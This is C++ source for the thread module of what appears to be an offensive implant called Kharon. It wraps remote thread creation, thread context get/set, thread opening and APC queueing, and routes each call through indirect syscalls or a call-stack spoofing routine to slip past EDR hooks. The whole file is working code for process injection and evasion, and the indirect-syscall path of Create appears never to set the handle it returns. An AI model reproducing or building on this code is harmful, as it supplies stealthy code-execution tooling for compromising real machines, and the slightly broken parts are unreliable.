#include <Kharon.h>

auto DECLFN Thread::Enum(
    _In_      INT8  Type,
    _In_opt_  ULONG ProcessID,
    _In_opt_  ULONG Flags,
    _Out_opt_ PSYSTEM_THREAD_INFORMATION ThreadInfo
) -> ULONG {
    PSYSTEM_PROCESS_INFORMATION SysProcInfo   = { 0 };
    PSYSTEM_THREAD_INFORMATION  SysThreadInfo = { 0 };
    PVOID                       ValToFree     = NULL;
    ULONG                       bkErrorCode   =  0;
    ULONG                       ReturnLen     = 0;
    ULONG                       RandomNumber  = 0;
    ULONG                       ThreadID      = 0;
    BOOL                        bkSuccess     = FALSE;

    Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, NULL, NULL, &ReturnLen );
    if ( !ReturnLen ) goto _KH_END;

    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)Self->Hp->Alloc( ReturnLen );
    ValToFree   = SysProcInfo;

    bkErrorCode = Self->Ntdll.NtQuerySystemInformation( SystemProcessInformation, SysProcInfo, ReturnLen, &ReturnLen );
    if ( bkErrorCode ) goto _KH_END;

    SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );

    while( 1 ) {
        if ( SysProcInfo->UniqueProcessId == UlongToHandle( Self->Session.ProcessID ) ) {
            SysThreadInfo = SysProcInfo->Threads;

            for ( INT i = 0; i < SysProcInfo->NumberOfThreads; i++ ) {
                if ( Type == TdRandom ) {
                    if ( HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ) != Self->Session.ThreadID ) {
                        ThreadID = HandleToUlong( SysThreadInfo[i].ClientId.UniqueThread ); goto _KH_END;
                    }
                }
            }
        }

        SysProcInfo = (PSYSTEM_PROCESS_INFORMATION)( U_PTR( SysProcInfo ) + SysProcInfo->NextEntryOffset );
    }

_KH_END:
    if ( SysProcInfo ) Self->Hp->Free( ValToFree );

    return ThreadID;
}

auto DECLFN Thread::Create(
    _In_  HANDLE ProcessHandle,
    _In_  PVOID  StartAddress,
    _In_  PVOID  Parameter,
    _In_  ULONG  StackSize,
    _In_  ULONG  uFlags,
    _Out_ ULONG* ThreadID
) -> HANDLE {
    const UINT32 Flags  = SYSCALL_FLAGS;
    HANDLE       Handle = INVALID_HANDLE_VALUE;
    NTSTATUS     Status = STATUS_UNSUCCESSFUL;

    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
        if ( ProcessHandle ) {
            return Self->Krnl32.CreateRemoteThread(
                ProcessHandle, 0, StackSize, 
                (LPTHREAD_START_ROUTINE)StartAddress, 
                PTR( Parameter ), uFlags, ThreadID
            );
        }

        return Self->Krnl32.CreateThread(
            0, StackSize, 
            (LPTHREAD_START_ROUTINE)StartAddress, 
            PTR( Parameter ), uFlags, ThreadID
        );
    }

    UPTR Address = ( Flags & SYSCALL_INDIRECT ) 
        ? (UPTR)Self->Sys->Ext[Sys::CrThread].Instruction 
        : (UPTR)Self->Krnl32.CreateRemoteThread;

    UPTR ssn = ( Flags & SYSCALL_INDIRECT ) 
        ? (UPTR)Self->Sys->Ext[Sys::CrThread].ssn 
        : 0;

    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
        SyscallExec( 
            Sys::CrThread, Status, ProcessHandle, 0, StartAddress, 
            Parameter, uFlags, ThreadID
        );
    } else {
        Handle = (HANDLE)Self->Spf->Call(
            Address, ssn, (UPTR)ProcessHandle, 0, (UPTR)StartAddress, 
            (UPTR)Parameter, uFlags, (UPTR)ThreadID
        );
    }

    return Handle;
}

auto DECLFN Thread::SetCtx(
    _In_ HANDLE   Handle,
    _In_ CONTEXT* Ctx
) -> BOOL {
    const UINT32 Flags  = SYSCALL_FLAGS;
    NTSTATUS     Status = STATUS_UNSUCCESSFUL;

    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
        return NT_SUCCESS( Self->Ntdll.NtSetContextThread( Handle, Ctx ) );
    }

    UPTR Address = ( Flags & SYSCALL_INDIRECT ) 
        ? (UPTR)Self->Sys->Ext[Sys::SetCtxThrd].Instruction 
        : (UPTR)Self->Ntdll.NtSetContextThread;
    
    UPTR ssn = ( Flags & SYSCALL_INDIRECT ) 
        ? (UPTR)Self->Sys->Ext[Sys::SetCtxThrd].ssn 
        : 0;

    Status = Self->Spf->Call(
        Address, ssn, (UPTR)Handle, (UPTR)Ctx
    );

    Self->Usf->NtStatusToError( Status );

    return NT_SUCCESS( Status );
}

auto DECLFN Thread::GetCtx(
    _In_  HANDLE   Handle,
    _Out_ CONTEXT* Ctx
) -> BOOL {
    const UINT32 Flags  = SYSCALL_FLAGS;
    NTSTATUS     Status = STATUS_UNSUCCESSFUL;

    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
        return NT_SUCCESS( Self->Ntdll.NtGetContextThread( Handle, Ctx ) );
    }

    UPTR Address = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::GetCtxThrd].Instruction
        : (UPTR)Self->Ntdll.NtGetContextThread;

    UPTR ssn = ( Flags & SYSCALL_INDIRECT )
        ? (UPTR)Self->Sys->Ext[Sys::GetCtxThrd].ssn
        : 0;

    Status = Self->Spf->Call(
        Address, ssn, (UPTR)Handle, (UPTR)Ctx
    );

    Self->Usf->NtStatusToError( Status );

    return NT_SUCCESS( Status );
}

auto DECLFN Thread::Open(
    _In_ ULONG RightAccess,
    _In_ BOOL  Inherit,
    _In_ ULONG ThreadID
) -> HANDLE {
    const UINT32 Flags = SYSCALL_FLAGS;
    
    OBJECT_ATTRIBUTES ObjAttr  = { sizeof(ObjAttr) };
    CLIENT_ID         ClientId = { 0, UlongToHandle( ThreadID ) };
    LONG              Status   = STATUS_UNSUCCESSFUL;
    HANDLE            Result   = nullptr;

    if ( ! ( Flags & ( SYSCALL_INDIRECT | SYSCALL_SPOOF ) ) ) {
        return Self->Krnl32.OpenThread( RightAccess, Inherit, ThreadID );
    }

    UPTR Address = ( Flags & SYSCALL_INDIRECT ) 
        ? (UPTR)Self->Sys->Ext[Sys::OpenThrd].Instruction 
        : (UPTR)Self->Krnl32.OpenThread;
    
    UPTR ssn = ( Flags & SYSCALL_INDIRECT ) 
        ? (UPTR)Self->Sys->Ext[Sys::OpenThrd].ssn 
        : 0;

    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
        SyscallExec( 
            Sys::OpenThrd, Status, &Result, RightAccess, (UPTR)&ObjAttr, (UPTR)&ClientId
        );
    } else {
        Status = Self->Spf->Call(
            Address, ssn, (UPTR)&Result, RightAccess, (UPTR)&ObjAttr, (UPTR)&ClientId
        );
    }

    Self->Usf->NtStatusToError( Status );
        
    return Result;
}

auto DECLFN Thread::QueueAPC(
    _In_     PVOID  CallbackFnc,
    _In_     HANDLE ThreadHandle,
    _In_opt_ PVOID  Argument1,
    _In_opt_ PVOID  Argument2,
    _In_opt_ PVOID  Argument3
) -> LONG {
    const UINT32 Flags  = SYSCALL_FLAGS;
    NTSTATUS     Status = STATUS_UNSUCCESSFUL;

    if ( ! ( Flags & (SYSCALL_INDIRECT | SYSCALL_SPOOF) ) ) {
        return Self->Ntdll.NtQueueApcThread(
            ThreadHandle, (PPS_APC_ROUTINE)CallbackFnc,
            Argument1, Argument2, Argument3
        );
    }

    UPTR Address = (Flags & SYSCALL_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::QueueApc].Instruction
        : (UPTR)Self->Ntdll.NtQueueApcThread;

    UPTR ssn = (Flags & SYSCALL_INDIRECT)
        ? (UPTR)Self->Sys->Ext[Sys::QueueApc].ssn
        : 0;

    if ( Flags & SYSCALL_INDIRECT && ! (Flags & SYSCALL_SPOOF) ) {
        SyscallExec( 
            Sys::QueueApc, Status, ThreadHandle,
            CallbackFnc, Argument1,
            Argument2, Argument3
        );
    } else {
        Status = (NTSTATUS)Self->Spf->Call(
            Address, ssn, (UPTR)ThreadHandle,
            (UPTR)CallbackFnc, (UPTR)Argument1,
            (UPTR)Argument2, (UPTR)Argument3
        );
    }

    Self->Usf->NtStatusToError( Status );

    return Status;
}